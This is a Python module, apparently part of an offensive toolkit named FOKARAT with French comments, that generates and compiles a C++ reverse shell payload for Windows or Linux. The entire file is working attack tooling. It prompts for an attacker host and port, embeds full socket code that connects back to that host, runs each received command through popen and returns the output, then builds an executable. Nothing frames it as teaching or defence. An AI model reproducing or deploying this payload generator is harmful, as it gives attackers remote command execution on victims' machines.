"""FOKARAT - Générateur C++ reverse shell (cross-platform via Mingw)"""
import os
import subprocess
import tempfile
from core.module_interface import ModuleInterface
from core.logger import Logger
from core.utils import ask_lhost_lport, ensure_dir, which

logger = Logger()


class CppPayloadGenerator(ModuleInterface):
    def get_metadata(self):
        return {
            "name": "C++ Reverse Shell",
            "version": "1.0",
            "type": "generator",
            "description": "Reverse shell C++ compilé via Mingw pour Windows."
        }

    def run(self, config):
        lhost, lport = ask_lhost_lport(config)
        logger.info(f"Génération C++ pour {lhost}:{lport}...")

        # Détection compilateur
        compilers = ["x86_64-w64-mingw32-g++", "i686-w64-mingw32-g++", "g++", "clang++"]
        compiler = next((c for c in compilers if which(c)), None)
        if not compiler:
            logger.error("Aucun compilateur trouvé (installez mingw-w64 ou g++).")
            return {"status": "error", "message": "No compiler"}

        is_windows = "mingw" in compiler or "w64" in compiler

        if is_windows:
            code = f'''#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

int main() {{
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 1;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons({lport});
    server.sin_addr.s_addr = inet_addr("{lhost}");
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {{ WSACleanup(); return 1; }}
    char buf[4096];
    while (1) {{
        int n = recv(sock, buf, sizeof(buf)-1, 0);
        if (n <= 0) break;
        buf[n] = 0;
        FILE* p = _popen(buf, "r");
        if (p) {{ char out[4096]; while (fgets(out, sizeof(out), p)) send(sock, out, strlen(out), 0); _pclose(p); }}
    }}
    closesocket(sock); WSACleanup(); return 0;
}}
'''
            ext = ".exe"
        else:
            code = f'''#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>

int main() {{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons({lport});
    inet_pton(AF_INET, "{lhost}", &server.sin_addr);
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) return 1;
    char buf[4096];
    while (1) {{
        int n = recv(sock, buf, sizeof(buf)-1, 0);
        if (n <= 0) break;
        buf[n] = 0;
        FILE* p = popen(buf, "r");
        if (p) {{ char out[4096]; while (fgets(out, sizeof(out), p)) send(sock, out, strlen(out), 0); pclose(p); }}
    }}
    close(sock); return 0;
}}
'''
            ext = ""

        out_dir = ensure_dir(config.get("output_dir", "output"))
        exe_path = os.path.join(out_dir, f"payload_cpp{ext}")

        with tempfile.NamedTemporaryFile(mode="w", suffix=".cpp", delete=False) as f:
            f.write(code)
            src = f.name

        try:
            subprocess.run([compiler, "-O2", "-o", exe_path, src], check=True, capture_output=True)
            logger.success(f"Payload C++ : {exe_path}")
            return {"status": "success", "payload_path": exe_path, "type": "cpp", "compiler": compiler}
        except subprocess.CalledProcessError as e:
            logger.error(f"Compilation échouée : {e.stderr.decode() if e.stderr else e}")
            return {"status": "error", "message": "Compilation failed"}
        finally:
            os.unlink(src)